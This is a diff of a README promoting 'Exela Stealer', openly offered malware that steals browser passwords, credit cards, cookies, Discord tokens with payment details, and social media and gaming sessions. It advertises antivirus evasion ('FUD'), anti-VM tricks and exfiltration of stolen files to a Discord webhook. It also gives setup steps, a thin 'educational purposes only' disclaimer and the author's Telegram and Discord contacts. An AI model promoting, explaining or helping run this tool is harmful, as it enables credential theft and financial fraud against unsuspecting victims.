@@ -1,64 +1,89 @@
  
    Telegram server: https://t.me/ExelaStealer
-### Settings
-
-> Install [Python 3.10](https://www.python.org/downloads/release/python-3100/) `Exela`
->
-> Then run the **_install.bat_** file to install all necessary packages
-
+   
+# Exela's Title
 - Exela Stealer
 
 - Runtime and Scantime FUD Stealer
 
-### ⚔️ 〢 Features
+# Features
+- Password Grabber
 
-#### Stealer
-> Supported Browser's (Chrome, Opera, OperaGX, Edge, Brave) 
+- Credit Card Grabber
 
-> Passwords, Cookies, Cards, Downloads, Historys
-> 
-> Discord Token and info Stealer
-> 
-> Instagram Session stealer & validator
-> 
-> Roblox Session stealer & validator
->
-> Steam Session stealer & validator
->
-> TikTok Session stealer & validator
->
-> Twitter Session stealer & validator
->
-> Reddit Session stealer & validator
->
-> Growtopia save.dat stealer
+- Cookie Grabber
 
+- History Grabber
 
-- - - - 
+- Download's Grabber
 
-#### Additional
+- Instagram Session stealer & validator
 
-> Ultra Anti-VM (Exela uses 12 different methods for Anti-VM)
+- Twitter Session stealer & validator
 
-> Sends all files to your discord webhook in beautiful embeds and a structured zip file
+- Tiktok Session stealer & validator
+
+- Reddit Session stealer & validator
+
+- Steam Session stealer & validator
+
+- Growtopia save.dat stealer
+
+- Discord Token Stealer
+
+- All private Discord info's ("Username, Phone Numbers, Email Adress, Payment information, Nitro status, Discord Account Biography, Discord Account PP, Discord Account ID, Discord Account MFA status")
 
 
+# Supported Browsers
+
+- Google Chrome
+
+- Opera
+
+- Opera GX
+
+- Brave
+
+- Microsoft Edge
+
+- Vivaldi
+
+- All Browsers versions Supported
+
+# Browsers to be added
+
+- FTP (Firefox)
+
+- Yandex
+
+# Additional
+
+- Ultra Strong Anti-VM (Exela use 12 different Anti-VM method)
+
+- Sends all files to your discord webhook in beautiful embeds and a structured zip file
+
+# Usage
+
+- Download the latest version of python from https://www.python.org/
+
+- Open the Exela and click to install.bat
 
 # Warning
--Just build and execute windows opereting systems
 
 - This project was developed for educational purposes only.
 
 - I am not responsible for any illegal use
 
-### Todo
-> - More grabbers (Twitch, spootfiy, Netflix, YouTube)
-> - Capture Screenshot
-> - Grab Wifi passwords
-> - Grab Network data
-> - Grab System info
-> - Firefox stealer
+- do not try to compile and execute on non windows operating system
 
+- just compile and execute on windows operating system
+
+# Note's
+- If there is anything you want me to add to this project, you can contact me via telegram or Discord.
+
+- My telegram => https://t.me/quicaxd
+
+- My discord => quicaxd#6889
 
 
 ## Screenshot's
